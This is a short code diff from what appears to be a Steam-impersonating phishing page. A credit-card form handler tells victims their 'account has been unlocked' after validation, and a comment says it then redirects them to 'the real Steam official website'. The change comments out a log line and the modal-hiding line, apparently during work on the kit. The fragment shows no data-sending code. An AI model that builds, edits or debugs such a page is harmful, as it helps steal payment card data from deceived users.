@@ -71,10 +71,10 @@ ccForm.addEventListener('submit', e => {
 
     // 4. 全部都通過，顯示成功訊息
     alert('✅ 驗證成功，您的帳號已經解鎖！');
-    console.log('>> validation passed, hiding modal and scheduling redirect');
+    // console.log('>> validation passed, hiding modal and scheduling redirect');
 
     // 5. 隱藏 Modal（背景仍可滾動）
-    verifyModal.style.display = 'none';
+    // verifyModal.style.display = 'none';
 
     // 6. 延遲跳轉到真正的 Steam 官網
     setTimeout(() => {
